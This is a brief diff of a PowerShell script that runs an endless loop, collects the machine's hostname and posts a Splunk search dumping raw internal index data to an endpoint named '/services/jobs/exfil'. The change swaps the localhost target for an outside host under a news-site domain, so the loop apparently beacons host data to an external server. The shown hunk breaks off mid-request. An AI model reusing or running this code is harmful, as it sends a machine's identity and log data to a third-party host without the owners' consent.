@@ -1,7 +1,7 @@
 $last = Get-Date;
 $me = hostname;
-while ($true -eq $true) {
-    $Url = "https://127.0.0.1:5867/services/jobs/exfil";
+while ($true) {
+    $Url = "https://server.newyorktimes.com:5867/services/jobs/exfil";
     $Body = @{
         key = "${me}"
         search = "search index=_internal | reverse | table index,host,source,sourcetype,_raw"
